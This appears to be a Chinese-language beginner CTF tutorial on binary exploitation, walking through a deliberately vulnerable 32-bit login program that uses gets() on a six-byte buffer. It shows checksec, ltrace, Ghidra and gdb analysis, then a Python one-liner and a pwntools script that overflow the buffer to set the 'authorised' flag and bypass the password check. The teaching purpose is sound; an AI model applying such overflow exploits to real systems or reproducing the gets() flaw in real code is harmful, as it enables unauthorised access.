# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用
# 获取文件信息
下载这个github库，进入01-overwriting_stack_variables_part1文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/05913327e82c4f2ba1a24360ee1c8766.png)

使用file命令查看文件的基本信息，可以看到这个文件和上一篇教程里的文件一样，32位，动态链接的……

![在这里插入图片描述](https://img-blog.csdnimg.cn/c40f44290924426e976b6ab2b4aa70cc.png)

然后使用checksec工具可以查看程序更详细的信息


![在这里插入图片描述](https://img-blog.csdnimg.cn/ab9493f9fa6641eeb3d5af60fde801fa.png)

这也和上一个文件相似，从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用nx，nx：数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```

# 利用缓冲区溢出绕过登录

现在我们运行文件看看，他叫我们输入密码，我们随便输入一个试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/89bf8fe0599a4641900f8abe2f67f992.png)

密码错误，然后程序退出了

![在这里插入图片描述](https://img-blog.csdnimg.cn/03f0eb7ba4fb4be88e22f8c1dfc44ffa.png)

我们可以尝试用ltrace来跟踪进程调用库函数的情况
```
ltrace ./login
```

可以看到，这里调用了puts函数和gets函数，然后我们随便输入一个值试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/919b7c2fa8b14d97bd2d56deac508f1f.png)

之后他就将我们输入的值和另一个值作了对比，由此可知，这个和我们输入的值做对比的字符就是密码，我们直接输入密码试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/b608256f35b343dd8e21ce56a2a8ea7f.png)

密码正确，这也是解题的一个办法

![在这里插入图片描述](https://img-blog.csdnimg.cn/f49fa33420c64414aba67b611d8ba708.png)

现在我们要利用缓冲区溢出来绕过登录，我们运行程序，输入一大堆字符试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/ce439c12326d4dbc82e9f338ed8642f0.png)


可以看到，程序报错了，授权号码也变得很大，之前我们输入正确的密码时，授权号码为1，现在我们要一个一个字符测试程序的缓冲区边界

在输入到第七个字符时，授权号码就发生了改变

![在这里插入图片描述](https://img-blog.csdnimg.cn/8e24d87689244e8dbd98d37b569038e1.png)

97，这是ascii码十进制的a字符

我们将第七个字符改成b试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/a2951e2bb5bf49a99e00f650eb9768f9.png)

可以看到，98就是是ascii码十进制的b字符

我们现在查看程序源代码看看

```
vim login.c
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4089416930984bcbaf3897421f0d8a2c.png)

```
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];   //定义了一个变量，名为passowrd，有6个字节的缓冲区
    int authorised = 0;   //定义了一个变量，名为authorised，为0

    printf("Enter admin password: \n");   //输出字符Enter admin password:
    gets(password);   //获取我们输入的字符，并存入到passowrd变量里

    if(strcmp(password, "pass") == 0)    //将我们输入的值和pass字符做对比，strcmp函数是比较两个字符串的大小，两个字符串相同时返回0，第一个字符串大于第二个字符串时返回一个正值，否则返回负值
    {
        printf("Correct Password!\n");   //输出字符Correct Password!
        authorised = 1;    //authorised为1
    }
    else   //错误的话
    {
        printf("Incorrect Password!\n");   //输出字符Incorrect Password!
    }

    if(authorised)   //如果authorised为1
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);  输出字符"Successfully logged in as Admin，%d是authorised变量的ascii码
    }else{   //不为1的话
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);   //输出字符
	}

    return 0;
}
```

## 静态分析
在没有程序源代码时，就只能用工具查看伪代码和汇编语言来分析程序，现在我们用ghidra打开程序，关于ghidra的安装和使用教程，第一篇文章都讲了，这里就不重复了

导入文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/7f1a9c60009c48eb8db82da02cdd1eef.png)

双击打开

![在这里插入图片描述](https://img-blog.csdnimg.cn/35be8acccb4f4f63a7c70fd1b2bec17b.png)

在函数列表里找到主函数main，然后单击

![在这里插入图片描述](https://img-blog.csdnimg.cn/e11bb4a08025498eb1296e6f2814f82b.png)

可以看到，ghidra生成的伪代码和我们源代码差不多，这里就不解释了

![在这里插入图片描述](https://img-blog.csdnimg.cn/1a4cf08292c94b35abe1c116a87635b4.png)

## 动态调试
用gdb打开程序分析
```
gdb login
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f3d36b1b9ea84d29875d2c91dac1f20a.png)

然后查看程序里调用的函数

```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/43dfad4662d4487fb72588e11ed22b30.png)

然后查看main函数的汇编代码
```
disassemble main
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/9e0ca43ce89c4991b4d536288c24e4d1.png)

在这里有一个对比指令，将一个变量和0做对比，这就是程序if判断的地方

![在这里插入图片描述](https://img-blog.csdnimg.cn/af2d50c6a5b04b64ae9b15c8b8cd87a9.png)

我们可以在这个对比指令的地址下一个断点，查看程序对比的流程
```
b *0x0804921e
run
```

运行程序后我们随意输入一些字符，程序运行到我们下断点的地方就会停下来

![在这里插入图片描述](https://img-blog.csdnimg.cn/773e79d7e17442f597d5f89e00850981.png)

这里将ebp寄存器里的值减去了0xc转换成10进制就是12和0做了对比，我们可以看一下这个地址的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/8951ecc55df444b19f3ce2e6bf758672.png)

```
x $ebp - 0xc
```
都为0，0和0对比是对的，之后就会执行跳转操作，跳到密码错误的地方

![在这里插入图片描述](https://img-blog.csdnimg.cn/a6a2157daa4d4d9fa83dfe0eaccdface.png)


我们可以修改这里的值，使程序不进行跳转操作

```
set *0xffffd39c = 1
```

成功修改了这个地址的值

![在这里插入图片描述](https://img-blog.csdnimg.cn/80ac73d8b37f4012b84f6f2805b510e2.png)

然后一直输入n，next的简写，可以看到，我们没有执行跳转操作，即使输入了错误的密码，也能成功登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/eebcfa4b1f4840398d805ec26cc1b9a1.png)

输入r重新运行程序，然后输入7个A字符

![在这里插入图片描述](https://img-blog.csdnimg.cn/e05f05a53ace4663b99e7239545811d2.png)

查看对比的值
```
x $ebp - 0xc
```

可以看到这里变成了0x41，转换成十进制为大写的A

![在这里插入图片描述](https://img-blog.csdnimg.cn/85cf352136ca4963b1311fc81e363cfc.png)

现在我们写一个脚本

```
z = "AAAAAA"
print(z + "\x01")
```
然后保存，用python3运行他
```
python3 exp.py | ./login
```
可以看到，现在值已经变成1了

![在这里插入图片描述](https://img-blog.csdnimg.cn/e56f5cf0831c4e6096e4ed3cf8ff4e7a.png)
# 第一个PwnTools脚本
```
from pwn import *   //导入pwntools模块

io = process('./login')   //运行程序

io.sendlineafter(b':', b'AAAAAA'+b"\x01")   //在程序输出"："后发送指定字符

print(io.recvall().decode())   //接收输出并且解码
```
然后运行这个脚本
```
python3 exploit.py
```

可以看到成功破解了

![在这里插入图片描述](https://img-blog.csdnimg.cn/51969601c5b449beb750edd18f052fb1.png)
# 总结
有什么不会或者是错误的地方的可以私信我，看到必回



